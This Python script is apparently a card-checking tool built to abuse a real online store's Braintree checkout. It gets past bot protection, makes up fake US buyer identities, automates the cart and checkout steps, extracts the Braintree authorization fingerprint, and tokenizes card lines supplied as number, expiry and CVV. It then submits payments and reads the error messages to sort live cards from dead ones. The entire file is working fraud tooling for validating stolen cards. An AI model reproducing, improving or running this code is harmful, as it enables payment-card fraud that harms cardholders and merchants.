import cloudscraper
from fake_useragent import UserAgent
import re
import time
import random
import json
import base64
import uuid
import requests
import pickle
import os
from faker import Faker

class PaymentGateway:
    def __init__(self):
        self.base_url = 'https://www.ovisonline.com'
        self.product_id = 1540
        self.ua_gen = UserAgent()
        self.faker = Faker('en_US')
        browser_config = {'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        self.scraper = cloudscraper.create_scraper(browser=browser_config, delay=10)
        self.cookies = {'frontend_lang': 'en_US', 'tz': 'Africa/Cairo'}
        self.headers = self._get_precise_headers()
        self.csrf_token = None
        self.order_id = None
        self.order_amount = None
        self.access_token = None
        self.partner_id = None
        self.transaction_reference = None
        self.payment_nonce = None
        self.card_details = None
        self.auth_fingerprint = None
        self.session_file = 'braintree_session.pkl'
        
        self.state_ids = {
            'Alabama': 1, 'Alaska': 2, 'Arizona': 3, 'Arkansas': 4, 'California': 5,
            'Colorado': 6, 'Connecticut': 7, 'Delaware': 8, 'Florida': 9, 'Georgia': 10,
            'Hawaii': 11, 'Idaho': 12, 'Illinois': 13, 'Indiana': 14, 'Iowa': 15,
            'Kansas': 16, 'Kentucky': 17, 'Louisiana': 18, 'Maine': 19, 'Maryland': 20,
            'Massachusetts': 21, 'Michigan': 22, 'Minnesota': 23, 'Mississippi': 24,
            'Missouri': 25, 'Montana': 26, 'Nebraska': 27, 'Nevada': 28, 'New Hampshire': 29,
            'New Jersey': 30, 'New Mexico': 31, 'New York': 32, 'North Carolina': 33,
            'North Dakota': 34, 'Ohio': 35, 'Oklahoma': 36, 'Oregon': 37, 'Pennsylvania': 38,
            'Rhode Island': 39, 'South Carolina': 40, 'South Dakota': 41, 'Tennessee': 42,
            'Texas': 43, 'Utah': 44, 'Vermont': 45, 'Virginia': 46, 'Washington': 47,
            'West Virginia': 48, 'Wisconsin': 49, 'Wyoming': 50
        }
        
        self.user_data = self.generate_random_us_data()
        self.load_session()

    def generate_random_us_data(self):
        first_name = self.faker.first_name()
        last_name = self.faker.last_name()
        username = f"{first_name.lower()}{random.randint(10, 99)}"
        email = f"{username}@gmail.com"
        phone = self.faker.phone_number().replace('.', '-')[:12]
        street = self.faker.street_address()
        city = self.faker.city()
        state = self.faker.state()
        zip_code = self.faker.zipcode()
        state_id = self.state_ids.get(state, 5)
        state_code = self.faker.state_abbr()
        
        return {
            'name': f"{first_name} {last_name}",
            'givenName': first_name,
            'surname': last_name,
            'email': email,
            'phone': f"+1{phone.replace('-', '')}",
            'street': street,
            'city': city,
            'state': state,
            'state_id': state_id,
            'state_code': state_code,
            'zip': zip_code,
            'country_id': 233,
            'country_code': 'US'
        }

    def _get_precise_headers(self, is_mobile=False, platform_type='windows', referer=None, content_type=None, accept='*/*'):
        user_agent_string = self.ua_gen.chrome
        headers = {
            'Accept': accept,
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Origin': self.base_url,
            'Referer': referer or self.base_url + '/',
            'User-Agent': user_agent_string,
            'X-Requested-With': 'XMLHttpRequest',
        }
        if content_type:
            headers['Content-Type'] = content_type
        return headers

    def _update_state(self, response_text):
        csrf_match = re.search(r'csrf_token[:=]\s*"([^"]+)"', response_text)
        if csrf_match:
            self.csrf_token = csrf_match.group(1)

        order_id_match = re.search(r'data-order-id="(\d+)"', response_text) or \
                         re.search(r'data-transaction-route="/shop/payment/transaction/(\d+)"', response_text)
        if order_id_match:
            self.order_id = order_id_match.group(1)
        
        partner_id_match = re.search(r'data-partner-id="(\d+)"', response_text)
        if partner_id_match:
            self.partner_id = partner_id_match.group(1)

        access_token_match = re.search(r'data-access-token="([a-f0-9\-]+)"', response_text)
        if access_token_match:
            self.access_token = access_token_match.group(1)

        amount_match = re.search(r'data-amount="([0-9.]+)"', response_text)
        if amount_match: 
            self.order_amount = amount_match.group(1)

    def _extract_auth_fingerprint(self, client_token):
        try:
            _, payload_b64, _ = client_token.split('.')
            padding = '=' * (4 - len(payload_b64) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload_b64 + padding).decode('utf-8')
            payload_json = json.loads(decoded_payload)
            if "authorizationFingerprint" in payload_json:
                return payload_json["authorizationFingerprint"]
        except Exception:
            try:
                padding = '=' * (4 - len(client_token) % 4)
                decoded_token = base64.urlsafe_b64decode(client_token + padding).decode('utf-8')
                match = re.search(r'"authorizationFingerprint":"(.*?)"', decoded_token)
                if match:
                    return match.group(1)
            except Exception:
                pass
        raise Exception("Failed to extract authorization fingerprint.")

    def save_session(self):
        session_data = {
            'authorization': f'Bearer {self.auth_fingerprint}',
            'csrf_token': self.csrf_token,
            'order_id': self.order_id,
            'order_amount': self.order_amount,
            'access_token': self.access_token,
            'partner_id': self.partner_id,
            'transaction_reference': self.transaction_reference
        }
        with open(self.session_file, 'wb') as f:
            pickle.dump(session_data, f)

    def load_session(self):
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'rb') as f:
                    session_data = pickle.load(f)
                    auth = session_data.get('authorization')
                    if auth and auth.startswith('Bearer '):
                        self.auth_fingerprint = auth.replace('Bearer ', '')
                        self.csrf_token = session_data.get('csrf_token')
                        self.order_id = session_data.get('order_id')
                        self.order_amount = session_data.get('order_amount')
                        self.access_token = session_data.get('access_token')
                        self.partner_id = session_data.get('partner_id')
                        self.transaction_reference = session_data.get('transaction_reference')
                    else:
                        self.auth_fingerprint = None
            except (pickle.UnpicklingError, EOFError, KeyError):
                os.remove(self.session_file)
                self.auth_fingerprint = None
                self.csrf_token = None
                self.order_id = None
                self.order_amount = None
                self.access_token = None
                self.partner_id = None
                self.transaction_reference = None
        else:
            self.auth_fingerprint = None

    def validate_session(self):
        if not os.path.exists(self.session_file):
            return False
        try:
            with open(self.session_file, 'rb') as f:
                session_data = pickle.load(f)
                required_keys = ['authorization', 'csrf_token', 'order_id']
                for key in required_keys:
                    if key not in session_data or not session_data[key]:
                        return False
                auth = session_data.get('authorization')
                if not auth or not auth.startswith('Bearer '):
                    return False
            return True
        except (pickle.UnpicklingError, EOFError, KeyError):
            return False

    def reset_session(self):
        self.cookies = {'frontend_lang': 'en_US', 'tz': 'Africa/Cairo'}
        self.auth_fingerprint = None
        self.csrf_token = None
        self.order_id = None
        self.order_amount = None
        self.access_token = None
        self.partner_id = None
        self.transaction_reference = None
        self.payment_nonce = None
        self.scraper = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}, delay=10)
        self.headers = self._get_precise_headers()
        self.user_data = self.generate_random_us_data()
        if os.path.exists(self.session_file):
            os.remove(self.session_file)

    def fetch_braintree_token(self):
        try:
            if self.validate_session() and self.auth_fingerprint:
                return True
            self.reset_session()
            self.run_simulation_steps()
            return bool(self.auth_fingerprint)
        except Exception:
            return False

    def check_card(self, card_line, stop_event=None, max_retries=3):
        if stop_event and stop_event.is_set():
            return None
        try:
            card_number, exp_month, exp_year, cvv = card_line.split('|')
            exp_year = '20' + exp_year[-2:] if len(exp_year) == 2 else exp_year
            self.card_details = {
                'number': card_number,
                'expirationMonth': exp_month,
                'expirationYear': exp_year,
                'cvv': cvv,
                'billingAddress': {
                    'postalCode': self.user_data['zip'],
                    'countryCodeAlpha2': self.user_data['country_code'],
                    'streetAddress': self.user_data['street'],
                    'locality': self.user_data['city'],
                    'region': self.user_data['state_code']
                }
            }
        except ValueError:
            return None

        if not self.validate_session() or not self.auth_fingerprint:
            self.reset_session()
            self.run_simulation_steps()

        retries = 0
        while retries < max_retries:
            if stop_event and stop_event.is_set():
                return None
            try:
                braintree_url = 'https://payments.braintree-api.com/graphql'
                braintree_headers = {
                    'Authorization': f'Bearer {self.auth_fingerprint}',
                    'Braintree-Version': '2018-05-10',
                    'Content-Type': 'application/json',
                    'Origin': 'https://assets.braintreegateway.com',
                    'Referer': 'https://assets.braintreegateway.com/'
                }
                braintree_data = {
                    'clientSdkMetadata': {'source': 'client', 'integration': 'dropin2', 'sessionId': str(uuid.uuid4())},
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                    'variables': {'input': {'creditCard': self.card_details, 'options': {'validate': False}}},
                    'operationName': 'TokenizeCreditCard'
                }
                token_response = requests.post(braintree_url, headers=braintree_headers, json=braintree_data)
                
                if token_response.status_code in [403, 401]:
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    continue
                
                token_data = token_response.json()
                if 'errors' in token_data:
                    if 'unauthorized' in json.dumps(token_data['errors']).lower() or 'forbidden' in json.dumps(token_data['errors']).lower():
                        self.reset_session()
                        self.run_simulation_steps()
                        retries += 1
                        continue
                    return None
                
                self.payment_nonce = token_data.get('data', {}).get('tokenizeCreditCard', {}).get('token')
                if not self.payment_nonce:
                    return None
                
                return self.payment_nonce
            except Exception:
                if retries < max_retries - 1:
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                else:
                    return None
        return None

    def submit_payment(self, token=None, stop_event=None):
        if stop_event and stop_event.is_set():
            return "Stopped by user"
        
        if token:
            self.payment_nonce = token
        
        if not self.payment_nonce or not all([self.order_id, self.access_token, self.partner_id, self.order_amount, self.csrf_token]):
            self.reset_session()
            self.run_simulation_steps()
        
        retries = 0
        max_retries = 3
        while retries < max_retries:
            if stop_event and stop_event.is_set():
                return "Stopped by user"
            try:
                final_payment_url = self.base_url + '/payment/braintree'
                final_data = {
                    'payment_method_nonce': self.payment_nonce,
                    'csrf_token': self.csrf_token,
                    'amount': self.order_amount,
                    'currency': 'USD',
                    'partner_id': self.partner_id,
                    'access_token': self.access_token,
                    'merchant_account_id': 'ovis_instant',
                    'reference': self.transaction_reference or self.order_id,
                    'email': self.user_data['email'],
                    'givenName': self.user_data['givenName'],
                    'surname': self.user_data['surname'],
                    'phoneNumber': self.user_data['phone'],
                    'streetAddress': self.user_data['street'],
                    'locality': self.user_data['city'],
                    'region': self.user_data['state_code'],
                    'postalCode': self.user_data['zip'],
                    'countryCodeAlpha2': self.user_data['country_code'],
                }
                headers_final = self._get_precise_headers(
                    referer=self.base_url+'/shop/payment',
                    content_type='application/x-www-form-urlencoded',
                    accept='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                )
                final_response = self.scraper.post(final_payment_url, data=final_data, headers=headers_final, cookies=self.cookies)
                
                if final_response.status_code in [403, 401]:
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    continue
                
                content_type = final_response.headers.get('Content-Type', '')
                if 'text/html' in content_type:
                    response_text = final_response.text
                    error_match = re.search(r'Payment Failed: (.*?)(,|\n)', response_text)
                    if error_match:
                        return error_match.group(1).strip()
                    braintree_error_match = re.search(r'<div id="braintree_error">(.*?)</div>', response_text, re.DOTALL)
                    if braintree_error_match:
                        error = re.sub(r'\s+', ' ', braintree_error_match.group(1)).strip()
                        if "Transaction not Found" in error:
                            self.reset_session()
                            self.run_simulation_steps()
                            retries += 1
                            continue
                        return error
                    if 'Thank you for your order' in response_text:
                        return "Payment method successfully added"
                    title_match = re.search(r'<title>(.*?)</title>', response_text)
                    if title_match:
                        return title_match.group(1).strip()
                    return response_text
                
                return final_response.text
            except Exception as e:
                if retries < max_retries - 1:
                    self.reset_session()
                    self.run_simulation_steps()
                    retries += 1
                    time.sleep(random.uniform(1, 3))
                else:
                    return str(e)
        return "Max retries reached"

    def run_simulation_steps(self):
        self.step_1_add_to_cart()
        self.step_2_process_to_checkout()
        self.step_3_submit_address()
        self.step_4_confirm_order()
        self.step_5_prepare_braintree()
        self.save_session()

    def step_1_add_to_cart(self):
        home_url = self.base_url + '/'
        response = self.scraper.get(home_url, headers=self._get_precise_headers(), cookies=self.cookies)
        self.cookies.update(response.cookies.get_dict())
        self._update_state(response.text)
        
        add_to_cart_url = self.base_url + '/shop/cart/update'
        data = {'product_id': self.product_id, 'add_qty': 1, 'csrf_token': self.csrf_token}
        headers = self._get_precise_headers(referer=home_url, content_type='application/x-www-form-urlencoded')
        add_response = self.scraper.post(add_to_cart_url, cookies=self.cookies, headers=headers, data=data, allow_redirects=True)
        self.cookies.update(add_response.cookies.get_dict())
        self._update_state(add_response.text)
        if not self.order_id:
            raise Exception("Failed to add product to cart")

    def step_2_process_to_checkout(self):
        checkout_url = self.base_url + '/shop/checkout'
        headers = self._get_precise_headers(referer=self.base_url + '/shop/cart')
        response = self.scraper.get(checkout_url, headers=self._get_precise_headers(), cookies=self.cookies)
        self.cookies.update(response.cookies.get_dict())
        self._update_state(response.text)

    def step_3_submit_address(self):
        address_url = self.base_url + '/shop/address'
        data = {
            'name': self.user_data['name'],
            'email': self.user_data['email'],
            'phone': self.user_data['phone'],
            'street': self.user_data['street'],
            'city': self.user_data['city'],
            'zip': self.user_data['zip'],
            'country_id': str(self.user_data['country_id']),
            'state_id': str(self.user_data['state_id']),
            'csrf_token': self.csrf_token,
            'submitted': '1',
        }
        headers = self._get_precise_headers(referer=self.base_url + '/shop/checkout', content_type='application/x-www-form-urlencoded')
        response = self.scraper.post(address_url, data=data, headers=headers, cookies=self.cookies, allow_redirects=True)
        self.cookies.update(response.cookies.get_dict())
        self._update_state(response.text)

    def step_4_confirm_order(self):
        payment_url = self.base_url + '/shop/payment'
        headers = self._get_precise_headers(referer=self.base_url + '/shop/address')
        response = self.scraper.get(payment_url, headers=headers, cookies=self.cookies)
        self.cookies.update(response.cookies.get_dict())
        self._update_state(response.text)
        
        update_carrier_url = self.base_url + '/shop/update_carrier'
        carrier_data = {'jsonrpc': '2.0', 'method': 'call', 'params': {'carrier_id': 30}}
        headers_json = self._get_precise_headers(referer=payment_url, content_type='application/json')
        self.scraper.post(update_carrier_url, json=carrier_data, headers=headers_json, cookies=self.cookies)
        
        time.sleep(7)

    def step_5_prepare_braintree(self):
        if not all([self.order_id, self.access_token, self.partner_id, self.order_amount, self.csrf_token]):
            raise Exception("Missing required data for Braintree payment")
        if 'session_id' not in self.cookies:
            raise Exception("Failed to find session_id")
            
        transaction_url = f'{self.base_url}/shop/payment/transaction/{self.order_id}'
        transaction_data = {
            'jsonrpc': '2.0', 'method': 'call', 'params': {
                'payment_option_id': 16, 'amount': float(self.order_amount), 'currency_id': 2,
                'partner_id': int(self.partner_id), 'access_token': self.access_token,
                'flow': 'redirect', 'tokenization_requested': False,
                'landing_route': '/shop/payment/validate', 'csrf_token': self.csrf_token,
            }
        }
        headers_json = self._get_precise_headers(referer=self.base_url+'/shop/payment', content_type='application/json')
        response = self.scraper.post(transaction_url, json=transaction_data, headers=headers_json, cookies=self.cookies)
        
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            raise Exception("Failed to parse server response")
        if response_json.get('error'):
            raise Exception(f"Server error: {response_json['error']['data']['message']}")

        html_content = response_json.get('result', {}).get('redirect_form_html', '')
        client_token_match = re.search(r'name="token" value="([^"]+)"', html_content)
        reference_match = re.search(r'name="reference" value="([^"]+)"', html_content)
        if not client_token_match:
            raise Exception("Failed to find Client Token")
        if reference_match:
            self.transaction_reference = reference_match.group(1)
        
        client_token = client_token_match.group(1)
        self.auth_fingerprint = self._extract_auth_fingerprint(client_token)

gateway = PaymentGateway()